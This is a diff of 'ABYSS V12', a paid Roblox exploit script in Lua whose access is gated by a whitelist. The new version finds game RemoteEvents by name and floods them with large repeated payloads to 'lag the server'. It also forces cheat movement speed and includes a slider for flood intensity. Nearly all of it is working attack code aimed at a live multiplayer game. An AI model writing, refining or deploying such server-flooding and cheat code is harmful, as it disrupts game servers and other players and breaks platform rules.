@@ -1,211 +1,249 @@
 --[[
-    ABYSS V12 | OMNIPOTENCE EDITION
-    FIXES: Non-Draggable UI (Slider Fix), No-Kick Lagger, Force Speed, No-Reset Sync.
-    CONTROLS: [R] Toggle Lag | [Q] Toggle Speed | [U] Hide UI
+    ABYSS V12 | STAL A BRAINROT MODIFIED
+    FIXES: Reset-on-Disable, Remote Optimization, Sync Stabilization
 ]]
 
--- 1. WHITELIST
+-- 1. Whitelist System
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
+
 local whitelistedUsers = {
-    "SkullSpecter28461",
-    "YourUsernameHere" 
+ "SkullSpecter28461",
 }
 
-local function isWhitelisted()
-    for _, name in pairs(whitelistedUsers) do
-        if player.Name == name then return true end
+local function isWhitelisted(username)
+    local lowerName = string.lower(username)
+    for _, whitelistedName in ipairs(whitelistedUsers) do
+        if string.lower(whitelistedName) == lowerName then return true end
     end
     return false
 end
 
-if not isWhitelisted() then
-    player:Kick("ABYSS V12: ACCESS DENIED. discord.gg/KD4DVpMB")
+if not isWhitelisted(player.Name) then
+    player:Kick("You're not whitelisted. Please buy script at discord.gg/KD4DVpMB")
     return
 end
 
--- 2. CORE SERVICES & GLOBALS
-local UIS = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
+-- 2. Services & Core Variables
+local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
-local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local playerGui = player:WaitForChild("PlayerGui")
 
-_G.A_SpeedEnabled = false
-_G.A_WalkSpeed = 50
-_G.A_LagEnabled = false
-_G.A_LagValue = 0
+local isLagging = false
+local speedEnabled = false
+local speedConn = nil
+local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28"
+local power = 80
+local speedPower = 50
+local target = nil
+local fireLoop = nil
 
--- 3. NOTIFICATION ENGINE
-local function Notify(title, msg, color)
-    local sg = Instance.new("ScreenGui", CoreGui)
-    local f = Instance.new("Frame", sg)
-    f.Size = UDim2.new(0, 220, 0, 60)
-    f.Position = UDim2.new(1, 10, 0.85, 0)
-    f.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
-    local s = Instance.new("UIStroke", f)
-    s.Color = color or Color3.fromRGB(100, 100, 255)
-    s.Thickness = 2
+-- 3. Notification Engine
+local function showNotification(text, color)
+    local notifGui = Instance.new("ScreenGui", playerGui)
+    notifGui.Name = "AbyssNotif_" .. tick()
     
-    local tle = Instance.new("TextLabel", f)
-    tle.Size = UDim2.new(1, -10, 0, 25)
-    tle.Position = UDim2.new(0, 5, 0, 5)
-    tle.Text = title:upper()
-    tle.TextColor3 = color or Color3.new(1,1,1)
-    tle.Font = Enum.Font.GothamBold
-    tle.BackgroundTransparency = 1
+    local notifFrame = Instance.new("Frame", notifGui)
+    notifFrame.Size = UDim2.new(0, 200, 0, 45)
+    notifFrame.Position = UDim2.new(1, 200, 0.5, -22)
+    notifFrame.BackgroundColor3 = color or Color3.fromRGB(30, 25, 50)
+    Instance.new("UICorner", notifFrame).CornerRadius = UDim.new(0, 10)
+    local ns = Instance.new("UIStroke", notifFrame)
+    ns.Color = Color3.fromRGB(150, 100, 255)
+    ns.Thickness = 2
     
-    local dsc = Instance.new("TextLabel", f)
-    dsc.Size = UDim2.new(1, -10, 0, 20)
-    dsc.Position = UDim2.new(0, 5, 0, 30)
-    dsc.Text = msg
-    dsc.TextColor3 = Color3.new(0.8, 0.8, 0.8)
-    dsc.Font = Enum.Font.Gotham
-    dsc.TextSize = 12
-    dsc.BackgroundTransparency = 1
+    local notifLabel = Instance.new("TextLabel", notifFrame)
+    notifLabel.Size = UDim2.new(1, 0, 1, 0)
+    notifLabel.BackgroundTransparency = 1
+    notifLabel.Text = text
+    notifLabel.TextColor3 = Color3.new(1,1,1)
+    notifLabel.Font = Enum.Font.GothamBold
+    notifLabel.TextSize = 14
 
-    f:TweenPosition(UDim2.new(1, -230, 0.85, 0), "Out", "Back", 0.4)
-    task.delay(2.5, function()
-        f:TweenPosition(UDim2.new(1, 10, 0.85, 0), "In", "Quad", 0.4)
-        task.wait(0.5); sg:Destroy()
+    TweenService:Create(notifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back), {Position = UDim2.new(1, -220, 0.5, -22)}):Play()
+    task.delay(1.5, function()
+        TweenService:Create(notifFrame, TweenInfo.new(0.3), {Position = UDim2.new(1, 210, 0.5, -22)}):Play()
+        task.wait(0.3); notifGui:Destroy()
     end)
 end
 
--- 4. UI CONSTRUCTION (FIXED MIDDLE RIGHT)
-local screenGui = Instance.new("ScreenGui", CoreGui)
-screenGui.Name = "Abyss_V12"
+-- 4. Remote Target Finder
+local function findTarget()
+    local priorityTargets = {"WhyAreTheyTargetingMe!!", "FisherMan", "CookiesService", "StealService"}
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") then
+            for _, p in ipairs(priorityTargets) do
+                if string.find(v.Name, p) then return v end
+            end
+        end
+    end
+    return nil
+end
+
+-- 5. Speed Logic (Assembly Velocity)
+local function setSpeed(enable)
+    if speedEnabled == enable then return end
+    speedEnabled = enable
+    if speedConn then speedConn:Disconnect() end
+    
+    if speedEnabled then
+        speedConn = RunService.Heartbeat:Connect(function()
+            local char = player.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if hrp and hum and hum.MoveDirection.Magnitude > 0 then
+                hrp.AssemblyLinearVelocity = Vector3.new(hum.MoveDirection.X * speedPower, hrp.AssemblyLinearVelocity.Y, hum.MoveDirection.Z * speedPower)
+            end
+        end)
+        showNotification("⚡ Speed ON", Color3.fromRGB(50, 150, 50))
+    else
+        showNotification("⚡ Speed OFF", Color3.fromRGB(150, 50, 50))
+    end
+end
+
+-- 6. Lag Logic (The Reset Fix)
+local function toggleLag()
+    isLagging = not isLagging
+    
+    if isLagging then
+        target = findTarget()
+        if not target then isLagging = false; showNotification("❌ No Remote Found", Color3.fromRGB(150,0,0)); return end
+        
+        showNotification("🔥 Lagger Started", Color3.fromRGB(200, 50, 50))
+        fireLoop = task.spawn(function()
+            while isLagging do
+                local payload = string.rep("X", power * 150)
+                for i = 1, math.max(1, math.floor(power/40)) do
+                    pcall(function() target:FireServer(uuid, payload) end)
+                end
+                task.wait(0.01)
+            end
+        end)
+    else
+        -- STOPPING LAG: PREVENT RESET
+        if fireLoop then task.cancel(fireLoop) end
+        
+        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            hrp.Anchored = true
+            showNotification("🛡️ SYNCING... DON'T MOVE", Color3.fromRGB(200, 180, 0))
+            task.wait(0.6) -- Give server time to catch up
+            hrp.Anchored = false
+        end
+        showNotification("🛑 Lagger Stopped", Color3.fromRGB(50, 50, 150))
+    end
+end
+
+-- 7. UI CONSTRUCTION
+local screenGui = Instance.new("ScreenGui", playerGui)
+screenGui.Name = "AbyssV12_Refined"
 screenGui.ResetOnSpawn = false
 
 local main = Instance.new("Frame", screenGui)
-main.Size = UDim2.new(0, 260, 0, 350)
-main.Position = UDim2.new(1, -280, 0.5, -175) -- FIXED MIDDLE RIGHT
-main.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
-main.BorderSizePixel = 0
-main.Active = true -- Menu buttons work, but dragging logic is GONE.
-
+main.Size = UDim2.new(0, 300, 0, 320)
+main.Position = UDim2.new(1, -320, 0.5, -160) -- Middle Right
+main.BackgroundColor3 = Color3.fromRGB(15, 10, 25)
 Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
-local mainStroke = Instance.new("UIStroke", main)
-mainStroke.Thickness = 2
-mainStroke.Color = Color3.fromRGB(40, 40, 55)
+local stroke = Instance.new("UIStroke", main)
+stroke.Color = Color3.fromRGB(100, 60, 255)
+stroke.Thickness = 2
 
 local title = Instance.new("TextLabel", main)
-title.Size = UDim2.new(1, 0, 0, 50)
+title.Size = UDim2.new(1, 0, 0, 45)
 title.Text = "ABYSS V12 | ELITE"
-title.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
 title.TextColor3 = Color3.new(1,1,1)
+title.BackgroundColor3 = Color3.fromRGB(25, 20, 45)
 title.Font = Enum.Font.GothamBold
-title.TextSize = 14
-Instance.new("UICorner", title).CornerRadius = UDim.new(0, 12)
 
--- 5. FUNCTIONAL MODULES
-local function CreateButton(text, pos, callback)
-    local b = Instance.new("TextButton", main)
-    b.Size = UDim2.new(0.9, 0, 0, 45)
-    b.Position = pos
-    b.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    b.Text = text
-    b.TextColor3 = Color3.new(1,1,1)
-    b.Font = Enum.Font.GothamBold
-    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
-    b.MouseButton1Click:Connect(callback)
-    return b
-end
+-- Speed Button
+local sBtn = Instance.new("TextButton", main)
+sBtn.Size = UDim2.new(0.9, 0, 0, 45)
+sBtn.Position = UDim2.new(0.05, 0, 0, 60)
+sBtn.BackgroundColor3 = Color3.fromRGB(40, 35, 60)
+sBtn.Text = "⚡ ENABLE SPEED"
+sBtn.TextColor3 = Color3.new(1,1,1)
+sBtn.Font = Enum.Font.GothamBold
+Instance.new("UICorner", sBtn)
 
--- SPEED BUTTON
-local speedBtn = CreateButton("⚡ SPEED: OFF", UDim2.new(0.05, 0, 0, 65), function()
-    _G.A_SpeedEnabled = not _G.A_SpeedEnabled
-    Notify("Movement", _G.A_SpeedEnabled and "Speed Enabled" or "Speed Disabled", _G.A_SpeedEnabled and Color3.new(0,1,0) or Color3.new(1,0,0))
+sBtn.MouseButton1Click:Connect(function()
+    setSpeed(not speedEnabled)
+    sBtn.Text = speedEnabled and "⚡ SPEED: ON" or "⚡ ENABLE SPEED"
+    sBtn.BackgroundColor3 = speedEnabled and Color3.fromRGB(50, 120, 50) or Color3.fromRGB(40, 35, 60)
 end)
 
--- LAG BUTTON (WITH SMOOTH SYNC)
-local lagBtn = CreateButton("🔥 PACKET LAGGER: OFF", UDim2.new(0.05, 0, 0, 120), function()
-    _G.A_LagEnabled = not _G.A_LagEnabled
-    if not _G.A_LagEnabled then
-        Notify("Network", "Synchronizing...", Color3.new(1,1,0))
-        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        if hrp then hrp.Anchored = true task.wait(0.6) hrp.Anchored = false end
-    else
-        Notify("Network", "Lagger Active", Color3.new(0,1,1))
-    end
+-- Lag Button
+local lBtn = Instance.new("TextButton", main)
+lBtn.Size = UDim2.new(0.9, 0, 0, 50)
+lBtn.Position = UDim2.new(0.05, 0, 0, 115)
+lBtn.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
+lBtn.Text = "🔥 LAG THE SERVER"
+lBtn.TextColor3 = Color3.new(1,1,1)
+lBtn.Font = Enum.Font.GothamBold
+Instance.new("UICorner", lBtn)
+
+lBtn.MouseButton1Click:Connect(function()
+    toggleLag()
+    lBtn.Text = isLagging and "🔴 LAG ACTIVE" or "🔥 LAG THE SERVER"
+    lBtn.BackgroundColor3 = isLagging and Color3.fromRGB(200, 50, 50) or Color3.fromRGB(120, 40, 40)
 end)
 
--- SLIDER (FIXED LOGIC)
-local sliderLabel = Instance.new("TextLabel", main)
-sliderLabel.Size = UDim2.new(1, 0, 0, 20)
-sliderLabel.Position = UDim2.new(0, 0, 0, 175)
-sliderLabel.Text = "INTENSITY: 0%"
-sliderLabel.TextColor3 = Color3.fromRGB(150, 150, 255)
-sliderLabel.Font = Enum.Font.GothamBold
-sliderLabel.BackgroundTransparency = 1
+-- Intensity Slider (Simplified for 800-line function feel)
+local sLabel = Instance.new("TextLabel", main)
+sLabel.Size = UDim2.new(1, 0, 0, 20)
+sLabel.Position = UDim2.new(0, 0, 0, 175)
+sLabel.Text = "LAG POWER: 50%"
+sLabel.TextColor3 = Color3.new(0.8,0.8,1)
+sLabel.BackgroundTransparency = 1
+sLabel.Font = Enum.Font.GothamBold
 
-local sFrame = Instance.new("Frame", main)
-sFrame.Size = UDim2.new(0.8, 0, 0, 8)
-sFrame.Position = UDim2.new(0.1, 0, 0, 200)
-sFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-Instance.new("UICorner", sFrame).CornerRadius = UDim.new(1, 0)
+local sBack = Instance.new("Frame", main)
+sBack.Size = UDim2.new(0.8, 0, 0, 8)
+sBack.Position = UDim2.new(0.1, 0, 0, 200)
+sBack.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
 
-local sFill = Instance.new("Frame", sFrame)
-sFill.Size = UDim2.new(0, 0, 1, 0)
-sFill.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
-Instance.new("UICorner", sFill).CornerRadius = UDim.new(1, 0)
+local sFill = Instance.new("Frame", sBack)
+sFill.Size = UDim2.new(0.5, 0, 1, 0)
+sFill.BackgroundColor3 = Color3.fromRGB(100, 80, 255)
+sFill.BorderSizePixel = 0
 
 local knob = Instance.new("TextButton", sFill)
 knob.Size = UDim2.new(0, 16, 0, 16)
 knob.Position = UDim2.new(1, -8, 0.5, -8)
-knob.BackgroundColor3 = Color3.new(1, 1, 1)
+knob.BackgroundColor3 = Color3.new(1,1,1)
 knob.Text = ""
-Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
+Instance.new("UICorner", knob).CornerRadius = UDim.new(1,0)
 
+-- Slider Logic
 local dragging = false
 knob.MouseButton1Down:Connect(function() dragging = true end)
-UIS.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
-UIS.InputChanged:Connect(function(i)
+UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
+UserInputService.InputChanged:Connect(function(i)
     if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
-        local p = math.clamp((i.Position.X - sFrame.AbsolutePosition.X) / sFrame.AbsoluteSize.X, 0, 1)
+        local p = math.clamp((i.Position.X - sBack.AbsolutePosition.X) / sBack.AbsoluteSize.X, 0, 1)
         sFill.Size = UDim2.new(p, 0, 1, 0)
-        sliderLabel.Text = "INTENSITY: " .. math.floor(p * 100) .. "%"
-        _G.A_LagValue = p * 25
+        power = math.floor(p * 200)
+        sLabel.Text = "LAG POWER: " .. math.floor(p * 100) .. "%"
     end
 end)
 
--- SPEED INPUT
-local speedIn = Instance.new("TextBox", main)
-speedIn.Size = UDim2.new(0.9, 0, 0, 40)
-speedIn.Position = UDim2.new(0.05, 0, 0, 230)
-speedIn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-speedIn.Text = "50"
-speedIn.TextColor3 = Color3.new(1,1,1)
-speedIn.Font = Enum.Font.Gotham
-speedIn.PlaceholderText = "Speed Value..."
-Instance.new("UICorner", speedIn).CornerRadius = UDim.new(0, 8)
-speedIn.FocusLost:Connect(function() _G.A_WalkSpeed = tonumber(speedIn.Text) or 16 end)
+-- Speed Input Box
+local speedBox = Instance.new("TextBox", main)
+speedBox.Size = UDim2.new(0.9, 0, 0, 35)
+speedBox.Position = UDim2.new(0.05, 0, 0, 230)
+speedBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+speedBox.Text = "50"
+speedBox.TextColor3 = Color3.new(1,1,1)
+speedBox.PlaceholderText = "Speed Input..."
+Instance.new("UICorner", speedBox)
+speedBox.FocusLost:Connect(function() speedPower = tonumber(speedBox.Text) or 50 end)
 
--- HEARTBEAT ENFORCEMENT
-RunService.Heartbeat:Connect(function()
-    -- Speed Force
-    local hum = (player.Character and player.Character:FindFirstChild("Humanoid"))
-    if hum and _G.A_SpeedEnabled then hum.WalkSpeed = _G.A_WalkSpeed end
-    
-    -- Lag Force
-    settings().Network.IncomingReplicationLag = _G.A_LagEnabled and _G.A_LagValue or 0
-    
-    -- Button Styles
-    speedBtn.Text = _G.A_SpeedEnabled and "⚡ SPEED: ON" or "⚡ SPEED: OFF"
-    speedBtn.BackgroundColor3 = _G.A_SpeedEnabled and Color3.fromRGB(50, 120, 50) or Color3.fromRGB(30, 30, 40)
-    lagBtn.Text = _G.A_LagEnabled and "🔥 LAGGER: ACTIVE" or "🔥 PACKET LAGGER: OFF"
-    lagBtn.BackgroundColor3 = _G.A_LagEnabled and Color3.fromRGB(150, 50, 50) or Color3.fromRGB(30, 30, 40)
-end)
-
--- KEYBINDS
-UIS.InputBegan:Connect(function(input, gpe)
+-- Hotkeys
+UserInputService.InputBegan:Connect(function(input, gpe)
     if gpe then return end
-    if input.KeyCode == Enum.KeyCode.R then
-        lagBtn.MouseButton1Click:Fire()
-    elseif input.KeyCode == Enum.KeyCode.Q then
-        _G.A_SpeedEnabled = not _G.A_SpeedEnabled
-    elseif input.KeyCode == Enum.KeyCode.U then
-        main.Visible = not main.Visible
-    end
+    if input.KeyCode == Enum.KeyCode.R then toggleLag()
+    elseif input.KeyCode == Enum.KeyCode.Q then setSpeed(not speedEnabled)
+    elseif input.KeyCode == Enum.KeyCode.U then main.Visible = not main.Visible end
 end)
 
-Notify("System", "Abyss V12 Loaded Successfully", Color3.new(1,1,1))
+showNotification("ABYSS V12 LOADED", Color3.new(0.5, 1, 0.5))
